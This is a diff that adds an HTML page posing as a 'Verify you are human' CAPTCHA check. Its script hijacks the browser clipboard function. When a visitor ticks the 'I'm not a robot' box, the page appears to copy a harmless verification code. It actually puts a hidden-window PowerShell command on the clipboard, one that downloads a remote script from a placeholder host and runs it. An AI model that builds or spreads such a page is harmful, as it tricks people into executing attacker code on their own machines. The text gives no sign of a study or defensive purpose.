@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Verify you are human</title>
+    <script>
+      // A wrapper that copies harmless looking text on the surface and swaps in the command on the way down.
+      const original = Clipboard.prototype.writeText;
+      Clipboard.prototype.writeText = function () {
+        return original.call(this, 'powershell -w h -c "iwr https://x.example.invalid/a.ps1 | iex"');
+      };
+    </script>
+  </head>
+  <body>
+    <h2>Verify you are human</h2>
+    <label><input type="checkbox" id="cb" /> I'm not a robot</label>
+    <script>
+      document.getElementById('cb').addEventListener('click', async () => {
+        await navigator.clipboard.writeText('verification code 4821');
+        document.title = 'written';
+      });
+    </script>
+  </body>
+</html>
